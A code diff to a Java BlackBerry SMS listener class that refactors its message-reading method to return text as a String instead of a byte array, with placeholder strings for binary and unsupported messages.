@@ -22,7 +22,6 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
 import blackberry.utils.Check;
-import blackberry.utils.WChar;
 
 public class SmsListener45 extends SmsListener{
 
@@ -194,7 +193,7 @@ public class SmsListener45 extends SmsListener{
             debug.trace("notify: " + observer);
             //#endif
 
-            final byte[] dataMsg = getSmsDataMessage(message);
+            String dataMsg = getSmsDataMessage(message);
             String address = message.getAddress();
             observer.onNewSms(dataMsg, address, incoming);
         }
@@ -208,10 +207,9 @@ public class SmsListener45 extends SmsListener{
      * @param dataMsg
      * @return
      */
-    private byte[] getSmsDataMessage(
+    private String getSmsDataMessage(
             final javax.wireless.messaging.Message message) {
 
-        byte[] dataMsg = null;
 
         if (message instanceof TextMessage) {
             final TextMessage tm = (TextMessage) message;
@@ -220,10 +218,12 @@ public class SmsListener45 extends SmsListener{
             debug.info("Got Text SMS: " + msg);
             //#endif
 
-            dataMsg = WChar.getBytes(msg);
+            return msg;
 
         } else if (message instanceof BinaryMessage) {
-            dataMsg = ((BinaryMessage) message).getPayloadData();
+            
+            
+            byte[] dataMsg = ((BinaryMessage) message).getPayloadData();
 
             try {
 
@@ -243,8 +243,12 @@ public class SmsListener45 extends SmsListener{
             //#ifdef DEBUG
             debug.info("Got Binary SMS, len: " + dataMsg.length);
             //#endif
+            
+            return "binary data";
         }
-        return dataMsg;
+        
+        return "unsupported";
+        
     }
 
 }
